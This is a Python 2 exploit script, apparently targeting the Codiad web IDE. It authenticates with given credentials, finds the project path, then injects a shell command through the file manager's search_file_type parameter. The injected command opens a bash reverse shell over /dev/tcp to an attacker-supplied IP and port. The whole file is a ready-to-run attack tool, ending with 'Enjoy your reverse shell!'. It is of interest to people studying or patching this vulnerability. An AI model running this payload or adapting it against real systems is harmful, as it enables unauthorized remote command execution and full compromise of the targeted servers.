#!/usr/bin/env python
# encoding: utf-8

import requests
import urllib
import sys
import json

session = requests.Session()

def login(domain, username, password):
    global session
    url = domain + "/components/user/controller.php?action=authenticate"
    data = {
        "username":username,
        "password":password,
        "theme":"default",
        "language":"en"
    }
    response = session.post(url, data=data)
    content = response.content
    print "[+] Login Content : %s" % (content)
    if 'status":"success"' in content:
        return True

def get_write_able_path(domain):
    global session
    url = domain + "/components/project/controller.php?action=get_current"
    response = session.get(url)
    content = response.content
    print "[+] Path Content : %s" % (content)
    json_obj = json.loads(content)
    if json_obj['status'] == "success":
        return json_obj['data']['path']
    else:
        return False

def exploit(domain, username, password, ip, port, path):
    global session
    url = domain + "components/filemanager/controller.php?action=search&path=%s" % (path)
    payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F'''+ip+'''%2F'''+port+'''+0%3E%261'%0Agrep+%22SniperOJ'''
    data = "search_string=Hacker&search_file_type=" + payload
    headers = {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
    response = session.post(url, data=data, headers=headers)
    content = response.content
    if content == '''{"status":"error","message":"No Results Returned"}''':
        print "[-] If your see this message immediately, three reasons:"
        print "[+] 1. you just haved exit the reverse shell."
        print "[+] 2. the target server cannot access your vps server"
        print "[+] 3. you havn't start listen a port on your vps server, so connection failed."

    print content

def main():
    if len(sys.argv) != 6:
        print "Usage : "
        print "        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT]" % (sys.argv[0])
        print "Example : "
        print "        python %s http://localhost/ admin admin 8.8.8.8 8888" % (sys.argv[0])
        print "Author : "
        print "        WangYihang <wangyihanger@gmail.com>"
        exit(1)
    domain = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    ip = sys.argv[4]
    port = sys.argv[5]
    print "[+] Please confirm that you have started tcp port : [%s] listening on your vps : [%s]" % (ip, port)
    raw_input("[Y/n]")
    print "[+] Starting..."
    if not login(domain, username, password):
        print "[-] Login failed! Please check your username and password."
        exit(2)
    print "[+] Login success!"
    print "[+] Getting writeable path..."
    path = get_write_able_path(domain)
    if path == False:
        print "[+] Get current path error!"
        exit(3)
    print "[+] Writeable Path : %s" % (path)
    print "[+] Sending payload..."
    exploit(domain, username, password, ip, port, path)
    print "[+] Exploit finished!"
    print "[+] Enjoy your reverse shell!"


if __name__ == "__main__":
    main()
